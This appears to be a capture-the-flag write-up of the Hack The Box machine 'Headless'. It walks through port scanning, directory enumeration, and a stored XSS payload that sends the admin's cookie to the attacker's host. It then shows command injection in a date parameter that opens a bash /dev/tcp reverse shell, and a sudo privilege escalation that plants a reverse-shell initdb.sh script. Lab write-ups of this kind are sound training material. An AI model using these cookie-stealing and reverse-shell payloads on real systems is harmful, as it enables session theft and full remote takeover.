## Port scanning

Initial portscanning

```
# Nmap 7.94SVN scan initiated Fri May 31 20:07:53 2024 as: nmap -p- -oA nmap/headless 10.10.11.8
Nmap scan report for 10.10.11.8
Host is up (0.055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

# Nmap done at Fri May 31 20:08:31 2024 -- 1 IP address (1 host up) scanned in 38.46 seconds
```

Detailed port scanning on found ports

```
# Nmap 7.94SVN scan initiated Fri May 31 20:08:56 2024 as: nmap -p 22,5000 -sV -sC -oA nmap/headless-detailed 10.10.11.8
Nmap scan report for 10.10.11.8
Host is up (0.055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Fri, 31 May 2024 18:09:03 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=5/31%Time=665A123F%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Fri,\x2031\x20May\x202024\x2018:09:03\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 20:10:33 2024 -- 1 IP address (1 host up) scanned in 96.74 seconds

```

We can see a python server listening on port 5000 (using the `Werkzeug` library)
Let's dig into it.

---

## Web Server

#### Directory Enumeration

We run a directory enumeration on background while looking through the website.

```
┌─[tobaka@parrot]─[~/ctf/htb]
└──╼ $gobuster dir -u http://10.10.11.8:5000 -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
Progress: 38267 / 38268 (100.00%)
===============================================================
Finished
===============================================================
```

Trying to browse the `/dashboard` endpoint give us this error message back
![](./Assets/./Assets/Pasted%20image%2020240605180432.png)

We might guess that we need the appropriate `is_admin` cookie to access the page (we saw it in the previous nmap scan)

#### XSS discovery

Homepage is useless but we found an interesting contact form at `/support`
![](./Assets/Pasted%20image%2020240605173445.png)

Filling it with simple info doesn't buy us anything.
Let's try to test it for XSS vuln.

![](./Assets/Pasted%20image%2020240605173741.png)

Submitting this request give us the following response
![](./Assets/Pasted%20image%2020240605173806.png)

Looks like it's sending those information to an admin.
If those info are being displayed on a browser, we might try to perform a XSS.
Just for testing purposes, we'll add a new http header and inject our payload into it.
We submit the following request and get back a request on our netcat listener.

![](./Assets/Pasted%20image%2020240605174324.png)

```
┌─[tobaka@parrot]─[~/ctf/htb/machines/headless]
└──╼ $nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.80] from (UNKNOWN) [10.10.14.80] 41568
GET / HTTP/1.1
Host: 10.10.14.80:9001
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.8:5000/
DNT: 1
Connection: close

```

#### Cookie stealing

We can use the XSS vuln to steal admin's cookie and get access to the `/dashboard` endpoint.

```
POST /support HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.8:5000/support
Content-Type: application/x-www-form-urlencoded
Content-Length: 190
Origin: http://10.10.11.8:5000
DNT: 1
Connection: close
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1
Pwn: <img src="" onerror="fetch('http://10.10.14.80:9001/' + document.cookie);">

fname=tobaka&lname=tobaka&email=root%40tobaka.rocks&phone=3333333333&message=%3Cimg+src%3D%22%22+onerror%3D%22fetch%28%27http%3A%2F%2F10.10.14.80%3A9001%2F%27+%2B+document.cookie%29%3B%22%3E
```

After a while we receive a request with the admin's cookie.

```
┌─[✗]─[tobaka@parrot]─[~/ctf/htb/machines/headless]
└──╼ $nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.80] from (UNKNOWN) [10.10.11.8] 52376
GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1
Host: 10.10.14.80:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:5000/
Origin: http://localhost:5000
Connection: keep-alive
```

#### /dashboard endpoint

We discover this functionality.
![](./Assets/Pasted%20image%2020240605194633.png)

After capturing the request with BURP suite and tweaking with it, we find out the date parameter is vulnerable to command injection.
We proceed to run a revshell and gain control of the machine.

```
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.8:5000/dashboard
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://10.10.11.8:5000
DNT: 1
Connection: close
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Upgrade-Insecure-Requests: 1

date=2+$(bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.80/9001+0>%261")
```

---

## Privesc

First things first, let's run a `sudo -l` and see what commands we can run.

```
-bash-5.2$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

Let's dig into `/usr/bin/syscheck`

```
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

We can see it runs the `initdb.sh` script if it's not running yet (a simple check will tell us there's no process running associated with the script)
Let's create a simple initdb.sh script which run a revshell (you can also invoke bash again if you want)

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.80/9002 0>&1
```

We run the script

```
bash-5.2$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.04, 0.03, 0.00
Database service is not running. Starting it...
```

We are root

```
┌─[tobaka@parrot]─[~/.ssh]
└──╼ $nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.14.81] from (UNKNOWN) [10.10.11.8] 41014
root@headless:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

---
